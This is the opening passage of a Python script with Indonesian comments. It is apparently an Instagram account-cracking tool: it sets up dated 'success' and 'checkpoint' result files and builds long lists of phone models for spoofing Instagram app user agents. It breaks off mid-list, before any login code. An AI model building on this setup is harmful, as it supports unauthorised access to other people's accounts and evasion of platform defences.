# Project ini open source jangan diperjual belikan!!
# Thanks for rozhakXD, ZoraaDev and Khamdihi untuk referensi project ini
import os, requests, json, random, uuid, re, datetime, time, rich, pytz, hashlib, base64
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor as Executor
from time import sleep
from rich import print as KenXinDev
from rich.panel import Panel
from rich.console import Console
from rich.columns import Columns
loop, success, checkpoint = 0, [], []
dumps, display_cp = [], []
data_login = {}
day = datetime.now().strftime("%Y-%m-%d")
success_file_insta = f"results/success-{day}.txt"
checkpoint_file_insta = f"results/checkpoint-{day}.txt"
success_detector_insta = f"results/success-detector-{day}.txt"
checkpoint_detector_insta = f"results/checkpoint-detector-{day}.txt"

# UBAH USER-AGENT DISINI 
class UserAgent:
    def instagram_app(self):
        self.htc = ["HTC One M8", "HTC One M9", "HTC 10", "HTC U11", "HTC U12+", "HTC Desire 626", "HTC Sensation", "HTC EVO 4G", "HTC One X", "HTC Desire Eye", "HTC One A9", "HTC U Ultra", "HTC Butterfly", "HTC Desire 820", "HTC Wildfire", "HTC HD2", "HTC Evo Shift 4G", "HTC Desire 610", "HTC One Mini", "HTC ThunderBolt", "HTC Droid DNA", "HTC Desire 816", "HTC Legend", "HTC Sensation XL", "HTC Incredible S", "HTC One S", "HTC Rhyme", "HTC Desire HD", "HTC Evo 3D", "HTC Touch Pro 2"]
        self.nexus = ['Galaxy Nexus', 'Nexus 10', 'Nexus 2', 'Nexus 4', 'Nexus 4', 'Nexus 4', 'Nexus 4', 'Nexus 4', 'Nexus 4', 'Nexus 5', 'phone/Nexus 5', 'Nexus 5X', 'Nexus 6', 'Nexus 7', 'Nexus 9', 'Nexus One', 'Nexus One', 'Nexus One', 'Nexus One', 'Nexus One', 'Nexus One', 'Nexus Player', 'Nexus Player', 'Nexus S', 'Nexus S', 'Nexus S 4G', 'nexus S', 'Nexus S', 'Nexus s', 'Nexus S', 'Nexus S', 'Nexus S', 'Nexus S', 'Nexus S']
        self.pixel = ["Pixel 5a", "Pixel 4a 5G", "Pixel 2 XL", "Pixel 6 Pro", "Pixel 4 XL", "Pixel 5", "Pixel 3", "Pixel 3 XL", "Pixel 4a", "Pixel 4", "Pixel 3a","Pixel 5 XL","Pixel 7a","Pixel 6 XL","Pixel 4a","Pixel 6a","Pixel 3a","Pixel 7 XL"]
        self.micromax = ['Micromax 10', 'Micromax 1J', 'Micromax 86519', 'Micromax A064', 'Micromax_A064', 'Micromax A065', 'Micromax_A065', 'Micromax A066', 'Micromax_A066', 'Micromax A067', 'Micromax_A067', 'MICROMAX_A068', 'MICROMAX A068', 'Micromax A068', 'Micromax A069', 'Micromax_A069', 'Micromax A075', 'Micromax A082', 'Micromax_A082', 'Micromax A089', 'Micromax_A089', 'Micromax A091', 'Micromax A092', 'Micromax_A092', 'Micromax A093', 'Micromax_A093', 'Micromax A095', 'Micromax A096', 'Micromax_A101', 'Micromax A102', 'Micromax_A102', 'Micromax A104', 'Micromax a104', 'Micromax A105', 'Micromax_A105', 'Micromax A106', 'Micromax-A106', 'Micromax A108', 'Micromax_A109', 'Micromax A109', 'Micromax A110', 'Micromax_A110', 'Micromax A110Q', 'Micromax_A110Q', 'Micromax A111', 'Micromax A114', 'Micromax A114R', 'Micromax_A114R', 'Micromax A115', 'Micromax_A115', 'Micromax A116', 'Micromax_A116', 'Micromax A116i', 'Micromax_A116i', 'Micromax A117', 'Micromax_A117', 'Micromax A118R', 'Micromax A119', 'Micromax A120', 'Micromax A121', 'Micromax_A121', 'Micromax A15', 'Micromax A177', 'Micromax A190', 'Micromax_A190', 'Micromax A200', 'Micromax_A200', 'Micromax A21', 'Micromax A210', 'Micromax A24', 'Micromax_A24', 'Micromax A25 Smarty', 'Micromax A250', 'Micromax A255', 'Micromax_A255', 'Micromax A26', 'Micromax_A26', 'Micromax_A27', 'Micromax A27', 'Micromax_A28', 'Micromax A28/GRI40', 'Micromax A28', 'Micromax A290', 'Micromax A30', 'Micromax A300', 'Micromax A310', 'Micromax A311', 'Micromax A315', 'Micromax_A315', 'Micromax_A316', 'Micromax A316', 'Micromax_A34', 'Micromax A34', 'Micromax_A35', 'Micromax A35', 'Micromax A350', 'Micromax_A36', 'Micromax A36', 'Micromax_A37', 'Micromax A37', 'Micromax A37B', 'Micromax_A37B', 'Micromax A40', 'Micromax_A40', 'Micromax A46', 'Micromax_A46', 'Micromax A47', 'MicromaxA47', 'Micromax_A50', 'Micromax A50', 'Micromax A51', 'Micromax A52', 'Micromax A54', 'Micromax A56', 'Micromax_A57', 'Micromax A57', 'Micromax A58', 'Micromax_A58', 'Micromax A59', 'Micromax A60', 'Micromax A61', 'Micromax A62', 'Micromax_A62', 'Micromax A63', 'Micromax_A63', 'Micromax_A65', 'Micromax A65', 'Micromax_A66', 'Micromax A66', 'Micromax A67', 'Micromax A68', 'Micromax A69', 'Micromax_A69', 'Micromax_A70', 'Micromax A700', 'Micromax A71', 'Micromax_A71', 'Micromax A72', 'Micromax_A72', 'Micromax A73', 'Micromax_A74', 'Micromax A74', 'Micromax A75', 'Micromax_A76', 'Micromax A76', 'Micromax A77', 'Micromax A78', 'Micromax A79', 'en_us Micromax A80', 'Micromax A80', 'Micromax A82', 'Micromax_A82', 'Micromax A84', 'Micromax A85', 'Micromax A86', 'Micromax_A86', 'Micromax_A87', 'Micromax A87', 'Micromax A87 . Ninja 4.0', 'Micromax A88', 'Micromax_A88', 'Micromax A89', 'Micromax A90', 'Micromax A90s', 'MIcromax_A90s', 'Micromax A90S', 'Micromax A91', 'Micromax_A91', 'Micromax_A92', 'Micromax A92', 'MicromaxA93', 'Micromax A93', 'Micromax A94', 'Micromax_A94', 'Micromax A96', 'Micromax_A96', 'Micromax A97', 'Micromax_A99', 'Micromax A99', 'Micromax_AD3520', 'Micromax AD3520', 'Micromax AD3550', 'Micromax AD4500', 'Micromax_AD4500', 'Micromax AE90', 'Micromax AO5510', 'Micromax AQ5000', 'Micromax B4A', 'Micromax B5 Pro', 'B5Pro', 'Micromax_Bharat_5_Plus', 'Micromax Q402Plus', 'Micromax Q440', 'Micromax Bharat 5', 'Micromax Q4204', 'Micromax Bharat 5 Plus', 'Micromax Bharat 5 Pro', 'Micromax Bolt 3425', 'Micromax Bolt 2', 'Micromax Q402+', 'Micromax Q306', 'Micromax Q3001', 'Micromax Q301', 'Micromax Q303', 'Micromax Q324', 'Micromax Q326', 'Q327', 'Micromax Q327', 'Micromax Q3301', 'Micromax Q333', 'Micromax_Q333', 'Micromax Q338', 'Micromax Q346', 'Micromax Q354', 'Micromax Q357', 'Micromax Q383', 'Micromax_S302', 'Micromax S302', 'Micromax Q424', 'Micromax Q352', 'Micromax Q4101', 'Micromax C2A', 'Micromax C9', 'Micromax C1', 'Micromax C1A', 'Micromax C2APLS', 'Micromax Q4310', 'Micromax E4815', 'arm_64 Micromax E481', 'Micromax E481', 'Micromax E4816', 'Micromax Q462', 'Micromax Q463', 'Micromax E485', 'Micromax E484', 'Micromax AQ4501', 'Micromax AQ4502', 'A240', 'Micromax A240', 'Micromax Q391', 'Micromax E453', 'Micromax A107', 'Micromax HS2', 'Micromax HS1', 'Micromax_HS3', 'en Micromax_HS3', 'AQ5001', 'Micromax AQ5001', 'AQ5001 Canvas Power', 'Micromax Q392', 'Micromax Q465', 'Micromax Q461', 'Micromax Q350R', 'Micromax Q421', 'Micromax Q417', 'Micromax Q426', 'Micromax Q4260', 'Micromax E311', 'Micromax E352', 'Micromax E455', 'Micromax Q415', 'Micromax Q355', 'Micromax Q469', 'Micromax E451', 'Micromax E451', 'Micromax Q340', 'Micromax Q349', 'Micromax Q345', 'Micromax Q450', 'Micromax Q480', 'arm_64 Micromax Q480', 'Micromax Q380', 'Micromax Q3502', 'Micromax Q351', 'Micromax Q385', 'P70221', 'Micromax P681', 'MicromaxP802', 'Micromax Q427', 'Micromax_Q427', 'Micromax Q413', 'Micromax E313', 'Micromax D2', 'Micromax D200', 'Micromax_D200', 'Micromax D303', 'Micromax D304', 'Micromax_D304', 'Micromax D305', 'Micromax D306', 'Micromax D320', 'Micromax D321', 'Micromax D333', 'Micromax D340', 'Micromax D7517', 'Micromax DM5003', 'Micromax E353', 'Micromax E457', 'Micromax E458', 'Micromax E460', 'Micromax E471', 'Micromax E4817', 'Micromax E482', 'Micromax E483', 'Micromax E5018M', 'Micromax EG111', 'Micromax EG116', 'micromax F', 'micromax F189', 'Micromax F601', 'MicromaxF666', 'Micromax IN', 'Micromax E7533', 'Micromax E6523', 'IN_2b', 'IN_Note1', 'MICROMAX IN1', 'N8216', 'N8301', 'ione note', 'MICROMAX ione note', 'Micromax N4120', 'Micromax N8202', 'Micromax Ninja', 'Micromax Nitro', 'Micromax Note 1+', 'Micromax Note 5', 'Micromax Note3', 'Micromax NX', 'Micromax P001', 'Micromax P250(Funbook)', 'Micromax P255', 'Micromax P256', 'xx Micromax P275', 'Micromax_P275', 'Micromax P275', 'Micromax P280', 'Micromax P290', 'Micromax P310', 'Micromax P350', 'xx Micromax P350', 'Micromax P360', 'Micromax P362', 'Micromax P365', 'Micromax P410', 'Micromax P410i', 'Micromax_P410i', 'Micromax P420', 'Micromax P469', 'Micromax P470', 'MicromaxP480', 'Micromax P500(Funbook)', 'Micromax P560', 'Micromax P580', 'Micromax P580i', 'Micromax P600', 'Micromax P650', 'Micromax P650E', 'Micromax P660', 'Micromax P660', 'Micromax_P666', 'Micromax P666', 'MicromaxP680', 'Micromax P690', 'Micromax P701', 'MicromaxP702', 'Micromax P810', 'en Micromax Q300', 'Micromax_Q300', 'Micromax Q323', 'Micromax_Q323', 'Micromax Q325', 'Micromax_Q325', 'Micromax Q331', 'Micromax_Q331', 'Micromax Q332', 'Micromax_Q332', 'Micromax Q334', 'Micromax Q335', 'Micromax_Q335', 'Micromax Q336', 'Micromax_Q336', 'Micromax Q341', 'Micromax Q343', 'Micromax Q348', 'Micromax_Q353', 'en Micromax_Q353', 'Micromax_Q353P', 'Micromax Q3551', 'Micromax Q3555', 'Micromax Q361', 'Micromax Q370', 'Micromax_Q370', 'Micromax Q371', 'Micromax_Q371', 'Micromax Q375', 'Micromax_Q375', 'Micromax Q379', 'Micromax Q381', 'Micromax Q382', 'Micromax Q386', 'Micromax Q394', 'Micromax_Q394', 'Micromax Q395', 'Micromax Q397', 'Micromax Q398', 'arm Micromax Q398', 'Micromax Q400', 'Micromax_Q400', 'Micromax Q4002', 'en Micromax Q4002', 'Micromax Q401', 'Micromax Q402', 'Micromax Q402 Ultra', 'Micromax Q404', 'Micromax Q411', 'Micromax_Q411', 'Micromax Q412', 'Micromax Q414', 'Micromax Q416', 'Micromax Q419', 'Micromax Q4201', 'Micromax Q422', 'Micromax Q4220', 'Micromax Q423', 'Micromax Q428', 'Micromax_Q428', 'Micromax Q429', '720X1280 Micromax Q4309', 'Micromax Q4312', 'en_US Micromax Q437', 'Micromax Q440Plus', 'Micromax Q454', 'Micromax Q470', 'Micromax Q479', 'Micromax Q491', 'Micromax_Q491', 'Micromax Q502+', 'Micromax Q666', 'Micromax Q67', 'micromax Q68', 'micromax Q78', 'Micromax S300', 'Micromax_S300', 'Micromax S301', 'Micromax_S301', 'Micromax Q4311', 'Micromax Q4601', 'Micromax Q409A', 'Micromax Q409', 'Micromax Q452', 'Micromax Unite 3', 'Micromax Unite 2', 'Micromax Unite 2 A106', 'Micromax Q372', 'Micromax V89', 'Micromax Q4001', 'Micromax Q4202', 'Micromax Q4251', 'arm Micromax Q4251', 'Micromax W5509', 'Micromax X5098', 'Micromax-Xzoom A52', 'YU5530', 'YU5040', 'Micromax YU5900', 'YU5012', 'Micromax Z59']
        self.mz_plus = ['MZ-m1 note','MZ-m2 note','MZ-M3s','MZ-M3','MZ-M5s','MZ-M3 Max','MZ-m3 note','MZ-MX4','MZ-U20','MZ-MX4 Pro','MZ-PRO 5','MZ-U10','MZ-M5c','MZ-meizu M8 lite','MZ-mmm52','MZ-Meizu S6','MZ-M3 Max','MZ-M1 E','MZ-meizu note9','MZ-16 X','MZ-16th Plus','MZ-15 Plus','MZ-16T','MZ-M6','MZ-PRO 7 Plus','MZ-m1 metal','MZ-16s Pro','MZ-M5 Note','MZ-Meizu 6T','MZ-16 X','MZ-16th','MZ-MEIZU 18X','MZ-MEIZU 18s','MZ-M1822','MZ-meizu 17','MZ-meizu 17 Pro','MZ-MEIZU 18 Pro','MZ-TYH212U','MZ-MEIZU 20','MZ-MEIZU 20 Pro','Meizu C3','MZ-ZTE T660','ZTE BLADE 8']
        self.vivo = ['vivo 1002T', 'Vivo 1605', 'vivo 1730', 'vivo 1809', 'vivo_1820', 'vivo 1835', 'vivo 1914', 'vivo 2010', 'vivo 2019', 'vivo 2019', 'vivo 2019', 'vivo 2023', 'vivo 2027', 'vivo 3969', 'VIVO 5', 'Vivo 6', 'Vivo 7 Pro', 'Vivo 8', 'Vivo 93K Prime', 'vivo A5 ', 'vivo a54', 'Vivo A54', 'vivo a57', 'Vivo A87', 'VIVO A94', 'VIVO AIR', 'VIVO C8818', 'vivo E1', 'vivo E3', 'vivo E3', 'vivo E5', 'Vivo EGO', 'V1962BA', 'vivo h5', 'V1824A', 'V1824A', 'V1824BA', 'V2217A', 'V2217A', 'V2218A', 'V2218A', 'V2218A', 'V2243A', 'V1955A', 'I1927', 'I1928', 'V2024A', 'V2025A', 'V2025A', 'V2049A', 'V2049A', 'I2009', 'I2012', 'I2012', 'V2136A', 'V2136A', 'V2141A', 'V2171A', 'I2017', 'V2172A', 'V2172A', 'I2022', 'I2019', 'I2019', 'I2201', 'V1914A', 'V1914A', 'V1981A', 'V2055A', 'V2118A', 'V2157A', 'V2157A', 'V2154A', 'V2196A', 'V2196A', 'V2199A', 'V2231A', 'V2238A', 'V1936AL', 'V1936A', 'V1922A', 'V1922A', 'V1922A ', 'V1916A', 'V2023A', 'V2023A', 'VIVO V2023A', 'V2065A', 'V2061A', 'V2061A', 'V2143A', 'V2106A', 'V2165A', 'V2165A', 'V2180GA', 'V1986A', 'V2012A', 'V2012A', 'V2073A', 'V2073A', 'I2011', 'V2148A', 'I2018', 'V1919A', 'V2131A', 'V2220A', 'I2202', 'I2206', 'I2203', 'I2202', 'I2127', 'I2202', 'I2208', 'I2208', 'I2126', 'I2126', 'I2126', 'V2164KA', 'V2164KA', 'VIVO IV', 'VIVO IV', 'VIVO IV', 'VIVO IV', 'Vivo J5', 'vivo 1805', 'vivo 1805', 'vivo NEX', 'V1923A', 'vivo 1912', 'V1923A', 'vivo 1912', 'vivo 1913', 'V1924A', 'V1924A', 'vivo 1913', 'V1950A', 'V1950A', 'vivo NEX A', 'vivo NEX A', 'vivo 1813', 'V1821A', 'V1821A', 'vivo NEX S', 'vivo NEX S', 'Vivo ONE', 'Vivo ONE', 'PA2170', 'vivo PD1628F_EX', 'vivo PD1709', 'vivo PD1709F_EX', 'vivo PD1709F_EX', 'vivo PD1728', 'vivo PD1728', 'vivo PD1832F_EX', 'vivo PD2046F_EX', 'vivo PD2050F_EX', 'vivo PD2055F_EX', 'vivo PD2059F_EX', 'Vivo S', 'V1831A', 'V1831A', 'VIVO S1', 'Vivo S1 Prime', 'V1832A', 'V1832T', 'V2121A', 'V2121A', 'V2130A', 'V2130A', 'Vivo S11', 'Vivo S11 ', 'vivo S11t', 'vivo S11t', 'vivo S11t', 'vivo S11t', 'vivo S12', 'V2162A', 'Vivo S13', 'V2203A', 'V2207A', 'V2190A', 'V2244A', 'vivo S1Pro', 'Vivo S20 ', 'Vivo S21 ', 'Vivo S31', 'Vivo S4', 'Vivo S40', 'Vivo S41 /MMB439M', 'V1932A', 'vivo S6', 'V1962A', 'vivo S6T', 'V2020CA', 'V2020A', 'Vivo S76', 'V2031EA', 'vivo S7i(t)', 'vivo S7i(t)', 'vivo S7i(t)', 'V2080A', 'vivo S7t', 'vivo_S7t', 'vivo S7t', 'S7t 5G', 'vivo S7w', 'vivo S8', 'vivo S9', 'vivo S9', 'vivo S9', 'V2072A', 'V2048A', 'vivo S9t', 'V2168', 'V2168', 'V2153', 'V2153', 'V2150', 'V2151', 'V2151', 'V2151', 'V2143', 'vivo TD1602_EX', 'vivo U1', 'vivo 1916', 'vivo 1916', 'vivo 1921', 'V1941A', 'V1941A', 'V1928A', 'vivo V1', 'vivo V1', 'vivo V10', 'Vivo V10', 'VIVO V11', 'Vivo V11', 'vivo 1804', 'vivo 1804', 'vivo 1806', 'vivo 1806', 'vivo v11pro', 'vivo 1819', 'vivo 1818', 'vivo 1818', 'vivo 1920', 'vivo 1919', 'vivo 1907', 'vivo 1907', 'vivo 1907_19', 'vivo 1910', 'vivo 1909', 'vivo 1910', 'vivo 1933', 'vivo 1933', 'vivo V1907', 'vivo v19neo', 'vivo V1Max', 'vivo V1Max', 'vivo V2', 'V2040', 'vivo 2018', 'vivo 2018', 'V2022', 'Vivo V20A', 'Vivo V20G', 'V2066', 'V2108', 'V2050', 'V2050', 'V2050', 'V2061', 'V2055', 'Vivo V21S', 'V2130', 'V2132A', 'V2116', 'V2115', 'V2116', 'V2116', 'V2126', 'V2126', 'V2228', 'V2228', 'V2158', 'V2158', 'V2202', 'V2202', 'V2201', 'V2246', 'V2230', 'V2230', 'V2237', 'vivo V3', 'vivo V3', 'vivo V3Max A', 'vivo V3Max L', 'vivo v30', 'vivo v31', 'vivo V3L', 'vivo V3L', 'vivo V3L', 'vivo V3L', 'vivo V3M A', 'vivo V3M A', 'vivo V3MA', 'vivo_V3Max', 'vivo v45', 'vivo 1601', 'vivo V5', 'vivo 1609', 'vivo 1611', 'Vivo V51', 'Vivo V54', 'vivo 1612', 'vivo 1713', 'vivo V5S A', 'vivo 1718', 'vivo 1716', 'vivo Y79A', 'vivo Y79A', 'V2166BA', 'Vivo V8', 'vivo 1723', 'vivo V9 mini', 'vivo 1851', 'VIVO V9Pro', 'vivo 1851', 'vivo 1727', 'Vivo X', 'V2178A', 'V2229A', 'V2170A', 'V2170A', 'vivo Xplay3S', 'vivo Xplay3S', 'vivo Xplay3S', 'vivo Xplay5A', 'vivo Xplay5A', 'vivo Xplay5A', 'vivo Xplay5S', 'vivo Xplay5S', 'vivo Xplay6', 'vivo Xplay6L', 'vivo Xplay6', 'vivo Xplay6', 'vivo X710L', 'vivo X710L', 'vivo X710L', 'vivo X710L', 'vivo X1', 'vivo X1', 'vivo X1', 'vivo X1', 'Vivo X11', 'vivo X1S', 'vivo X1S', 'vivo X1S', 'vivo X1St', 'vivo X1St', 'vivo X1St', 'vivo X1St', 'vivo X1St', 'vivo X1W', 'vivo X1w', 'VIVO X2', 'VIVO X2', 'VIVO_X2', 'vivo X20', 'vivo X20A', 'vivo X20Plus A', 'vivo 1720', 'vivo X20Plus UD', 'vivo X20Plus UD', 'vivo X21', 'vivo X21A', 'vivo X21UD A', 'vivo X21i', 'vivo X21i A', 'vivo X21i', 'vivo X21i A ', 'V1814A', 'V1814T', 'V1814T', 'V1814A', 'V1809A', 'V1809A', 'V1816A', 'V1809T', 'V1816T', 'V1829A', 'V1838A', 'V1838T', 'V1829T', 'V1836A', 'V1836A', 'V1836T', 'vivo X27Pro', 'V1938CT', 'V1938T', 'V1938T', 'vivo X3F', 'vivo X3F', 'vivo X3F', 'vivo X3L', 'vivo X3L', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S W', 'vivo X3S W', 'vivo X3S W', 'vivo X3S W', 'vivo X3t', 'vivo X3t', 'vivo X3t', 'vivo X3t', 'vivo X3V', 'vivo X3V', 'vivo X3V', 'vivo X3V', 'Vivo X40', 'vivo X5L', 'vivo X5', 'vivo X5L', 'vivo X5Pro D', 'vivo X5Pro L', 'vivo X5Pro V', 'vivo X5Pro D', 'vivo X5Pro D', 'V2001A', 'V2001A', 'vivo 2004', 'vivo 2005', 'vivo 2005', 'V1937', 'vivo 1937', 'V1937', 'V1937', 'vivo 2006', 'vivo 2006', 'V2005A', 'V2011A', 'X50 Pro+', 'V1930', 'V1930', 'vivo X510t', 'vivo X510t', 'vivo X510t', 'vivo X510t', 'vivo X510t', 'vivo X520L', 'vivo X5F', 'vivo X5M', 'vivo X5M', 'vivo X5M', 'vivo X5Max ', 'vivo X5Max L', 'vivo X5Max L', 'vivo X5Max S', 'vivo X5Max V', 'vivo X5S L', 'vivo X5S L', 'vivo X5V', 'vivo X5V', 'vivo X5V', 'vivo X6D', 'vivo X6A', 'vivo X6Plus D', 'vivo X6Plus A', 'vivo X6Plus L', 'vivo X6Plus D', 'vivo X6Plus A', 'vivo X6Plus D', 'vivo X6Plus L', 'V2046A', 'V2059A', 'V2046A', 'V2045', 'V2046', 'V2047A', 'V2056A', 'V2085A', 'vivo X6S A', 'vivo X6S A', 'vivo X6S A', 'vivo X6S A', 'vivo X6SPlus D', 'vivo X6SPlus D', 'vivo X6SPlus D', 'vivo X6SPlus D', 'vivo X6SPlus A', 'vivo X7L', 'vivo X7Plus', 'vivo X7Plus', 'V2133A', 'V2104', 'V2104', 'V2105', 'V2134A', 'V2105', 'V2145A', 'V2114', 'V2145A', 'vivo X710F', 'vivo X710F', 'vivo X710F', 'vivo X710F', 'V2144', 'V2183A', 'V2144', 'V2208', 'V2185A', 'V2145', 'V2185A', 'Vivo X83', 'vivo X9', 'vivo X9L', 'vivo X9', 'vivo X9', 'vivo X9Plus', 'vivo X9Plus L', 'V2241A', 'V2242A', 'V2242A', 'V2227A', 'vivo X9i', 'vivo X9i', 'vivo X9i', 'vivo X9s', 'vivo X9s L', 'vivo X9s Plus', 'vivo X9s Plus', 'vivo X9s Plus L', 'vivo X9s Plus', 'VIVO XL', 'vivo Xplay', 'vivo Xshot', 'vivo Xshot', 'vivo Xshot', 'vivo Xshot', 'V2203', 'V2221', 'Vivo y1', 'Vivo Y1', 'V2168A', 'V2168A', 'vivo 1906', 'V2028', 'vivo Y11t', 'vivo Y11t', 'vivo Y11t', 'vivo 1904', 'V2163A', 'V2102', 'V2102', 'vivo 2007', 'vivo 2007', 'Vivo Y12I Pro', 'V2026', 'V2042', 'V2033', 'V2039', 'V2069', 'V2026_21', 'vivo Y13L', 'vivo Y13', 'vivo Y13L', 'vivo Y13L', 'vivo Y13i', 'vivo_Y13i', 'vivo Y13iL', 'vivo Y13iL', 'vivo Y13T', 'vivo Y13T', 'vivo 1901', 'vivo Y15T', 'vivo Y15T', 'V2134', 'V2147', 'V2147', 'V2212', 'V2120', 'V2204', 'V2214', 'V2204', 'vivo 1902', 'vivo 1902_19', 'VIVO 1902', 'vivo Y17T', 'vivo Y17T', 'vivo_Y17T', 'vivo Y17T', 'vivo Y17W', 'vivo Y17W', 'vivo Y17W', 'vivo Y18L', 'vivo Y18L', 'vivo Y18L', 'vivo 1915', 'vivo Y19t', 'vivo Y19t', 'vivo Y19t', 'vivo Y19t', 'Vivo Y1i', 'vivo 2015', 'vivo 2015', 'V2029', 'V2027', 'V2043_21', 'V2101', 'V2070', 'V2054', 'V2052', 'V2037', 'V2032', 'V2038', 'V2038', 'V2129', 'V2129', 'V2111', 'V2149', 'V2140', 'V2140', 'V2152', 'V2152', 'V2110', 'V2110', 'V2131', 'V2135', 'V2207', 'vivo Y22iL', 'vivo Y22iL', 'V2206', 'V2206', 'vivo Y23L', 'vivo Y23L', 'vivo y23l', 'vivo Y23L', 'vivo Y23L', 'vivo Y23L', 'vivo 1613', 'vivo Y27', 'vivo Y27L', 'vivo Y27', 'vivo Y28', 'vivo Y28', 'vivo Y28L', 'vivo Y28L', 'vivo Y29L', 'vivo Y29L', 'vivo Y29L', 'V1901A', 'V1901A', 'V1901A', 'V1901T', 'V1930A', 'vivo 1938', 'V2034A', 'V2036A', 'V2099A', 'V2099A', 'V2160', 'V2160', 'V2160', 'V2066BA', 'V2066A', 'Y30g', 'Vivo Y30S', 'vivo Y31L', 'V2068', 'V2054A', 'V2068A', 'V2068', 'V2158A', 'Vivo Y32', 'V2180A', 'V2057', 'V2109', 'V2166A', 'V2166A', 'V2146', 'V2205', 'V2205', 'vivo Y37A', 'vivo Y37', 'V2044', 'vivo Y3t', 'vivo Y3t', 'vivo Y3t', 'vivo y41', 'vivo Y5 ', 'Vivo Y5', 'vivo 1935', 'VIVO Y50(2021)', 'V2023EA', 'Y50t', 'V2035', 'vivo Y51L', 'vivo Y51A', 'V2030', 'vivo 1707', 'V2031_21', 'vivo Y51t L', 'vivo Y51t L', 'vivo Y51t L', 'V2053', 'V2057A', 'vivo Y53', 'vivo 1606A', 'vivo Y53n', 'V2058', 'V2123A', 'V2069A', 'V2045A', 'V2045A', 'vivo Y55A', 'V2127', 'V2127', 'vivo 1603', 'vivo Y55n', 'vivo 1610', 'V2164A', 'V2164A', 'V1934A', 'V2006', 'vivo Y613', 'vivo Y613', 'vivo Y613F', 'vivo Y622', 'vivo Y622', 'vivo Y622', 'vivo Y622', 'vivo Y622', 'vivo Y623', 'vivo Y623', 'vivo Y627', 'vivo Y627', 'vivo Y627', 'vivo Y627', 'vivo Y628', 'vivo Y628', 'vivo 1719', 'vivo Y66', 'vivo Y66L', 'vivo Y66i A', 'vivo Y67', 'vivo Y67A', 'vivo Y67L', 'vivo Y685', 'vivo 1714', 'vivo Y69A', 'V2002A', 'V2002A', 'vivo Y71A', 'vivo 1724', 'vivo Y71A', 'vivo 1801', 'V2041', 'V2060', 'V2102A', 'V1731CA', 'vivo Y73', 'Vivo Y73 /MMB239M', 'V2059', 'V2031A', 'V2164PA', 'V2117', 'vivo Y75A', 'V2142', 'V2142', 'vivo Y75s', 'vivo Y75s', 'vivo Y75S', 'vivo Y75s', 'V2124', 'V2156A', 'V2219A', 'V2219A', 'V2169', 'V2169', 'V1913A', 'vivo 1808i', 'vivo 1803', 'vivo 1803', 'vivo 1812', 'vivo Y81S', 'V1732A', 'V1732T', 'vivo Y83A', 'vivo 1802', 'vivo Y83A', 'vivo Y83A', 'vivo 1726', 'Vivo Y83I', 'vivo Y85A', 'vivo Y85', 'Vivo Y85i', 'Vivo Y86', 'V1730EA', 'vivo v1730ea', 'vivo 1908', 'vivo 1823', 'vivo 1908_19', 'vivo 1817', 'vivo 1811', 'vivo Y913', 'vivo Y913', 'vivo Y91C', 'vivo 1820', 'vivo 1816', 'vivo Y923', 'vivo Y923', 'vivo Y927', 'vivo Y927', 'vivo Y928', 'vivo Y928', 'vivo Y928', 'vivo 1814', 'V1818A', 'V1818A', 'vivo 1814', 'vivo Y937', 'vivo Y937', 'vivo Y937', 'V1818CT', 'V1818CA', 'vivo 1807', 'vivo Y95', 'V1813A', 'V1813T', 'V1813A', 'vivo Y97', 'V1945A', 'V1801A0', 'vivo Z1', 'vivo 1918', 'vivo 1951', 'vivo 1951', 'VIVO Z1Pro', 'vivo 1918', 'vivo 1918 Flow', 'Vivo Z10', 'vivo Z1i', 'V1730DA', 'V1730DT', 'vivo Z1i', 'vivo_1951', 'vivo 1917', 'V1813BA', 'V1813BT', 'V1813BT', 'Vivo Z34', 'vivo Z3x', 'V1730GA', 'vivo Z3x', 'vivo Z3x', 'V1921A', 'V1911A', 'V1911A', 'V1911A', 'V1990A', 'V1990A', 'V1963A', 'V1963A']
        self.vivo2 = ["vivo/iQOO 5 Pro", "vivo/iQOO 7", "vivo/iQOO Z5", "vivo/iQOO U3", "vivo/iQOO U1x", "vivo/iQOO Neo 3", "vivo/iQOO U1", "vivo/iQOO 8", "vivo/iQOO 9", "vivo/iQOO Z3", "vivo/iQOO Z6", "vivo/iQOO Z7", "vivo/iQOO U5", "vivo/iQOO U3x", "vivo/iQOO 6", "vivo/iQOO 10", "vivo/iQOO Z1", "vivo/iQOO 11", "vivo/iQOO Z2", "vivo/iQOO 12", "vivo/iQOO Z4", "vivo/iQOO 13", "vivo/iQOO Z8", "vivo/iQOO 14", "vivo/iQOO Z9", "vivo/iQOO 15", "vivo/iQOO Z10", "vivo/iQOO 16", "vivo/iQOO Z11", "vivo/iQOO 17", "vivo/iQOO Z12"]
        self.oneplus = ['NE2213', 'NE2217', 'NE2215', 'NE2210', 'NE2210', 'CPH2423', 'CPH2411', 'CPH2417', 'CPH2413', 'CPH2415', 'CPH2449', 'CPH2487', 'ONE A2003', 'ONE A2003', 'ONE A2001', 'ONE A2005', 'ONEPLUS A3003', 'ONEPLUS A3000', 'ONEPLUS A3010', 'ONEPLUS A5000', 'ONEPLUS A5000', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A6003', 'ONEPLUS A6000', 'ONEPLUS A6010', 'ONEPLUS A6013', 'ONEPLUS A6010', 'GM1900', 'GM1901', 'GM1903', 'GM1917', 'GM1913', 'GM1911', 'GM1910', 'GM1915', 'GM1910', 'HD1901', 'HD1903', 'HD1900 Flow', 'HD1905', 'HD1900', 'HD1907', 'HD1911', 'HD1913', 'HD1910', 'GM1925', 'HD1925', 'GM1920', 'IN2013', 'IN2015', 'IN2010', 'IN2010', 'IN2017', 'IN2019', 'IN2023', 'IN2025', 'IN2020', 'OnePlus8Pro', 'KB2005', 'KB2001', 'KB2007', 'KB2003', 'KB2000', 'OnePlus 8T 5G', 'LE2115', 'LE2113', 'LE2111', 'LE2110', 'LE2120', 'LE2125', 'LE2123', 'LE2121', 'LE2127', 'OnePlus9Pro', 'LE2101', 'LE2100', 'MT2111', 'MT2110', 'ONEPLUS A19677', 'ONEPLUS A2345', 'Oneplus A31', 'Oneplus A3331', 'ONEPLUS A35904', 'ONEPLUS A37000', 'ONEPLUS A3EVB', 'ONEPLUS A62322', 'ONEPLUS A64794', 'ONEPLUS A65369', 'ONEPLUS A68333', 'ONEPLUS A70458', 'ONEPLUS A70791', 'ONEPLUS A78637', 'ONEPLUS A80828', 'ONEPLUS A83306', 'ONEPLUS A87046', 'ONEPLUS 